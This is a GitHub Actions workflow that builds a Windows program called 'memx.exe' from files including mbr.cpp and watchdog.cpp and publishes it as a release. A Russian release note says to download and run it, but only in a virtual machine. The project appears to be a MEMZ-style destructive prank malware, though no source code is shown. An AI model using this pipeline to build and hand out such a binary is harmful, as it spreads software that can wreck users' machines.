name: Build MEMX

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: windows-2022

    steps:
      - uses: actions/checkout@v4

      - name: Setup MSVC
        uses: ilammy/msvc-dev-cmd@v1

      - name: Build memx.exe
        shell: cmd
        run: |
          cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp ^
          /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
          /SUBSYSTEM:WINDOWS /OUT:memx.exe

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          files: memx.exe
          tag_name: memx-${{ github.run_id }}
          name: "💀 MEMX Build #${{ github.run_number }}"
          body: |
            ## MEMX.exe
            
            Скачай и запусти.
            Размер: ~191 КБ
            
            ⚠️ ТОЛЬКО ДЛЯ ВИРТУАЛКИ!
          draft: false
          prerelease: true